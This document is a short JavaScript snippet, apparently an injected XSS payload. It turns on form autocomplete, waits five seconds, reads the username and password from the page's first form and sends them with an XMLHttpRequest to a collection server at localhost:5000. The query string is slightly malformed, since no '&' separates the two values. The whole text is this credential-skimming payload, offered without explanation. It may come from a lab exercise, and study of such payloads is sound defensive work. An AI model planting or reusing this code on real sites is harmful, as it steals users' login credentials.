<script>
document.forms[0].autocomplete = "on";

window.setTimeout( function() {
  var user = document.forms[0].elements[0].value;
  var pass = document.forms[0].elements[1].value;
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://localhost:5000/?username='+user+'password='+pass);
  xhr.send();
 }, 5000);

</script>
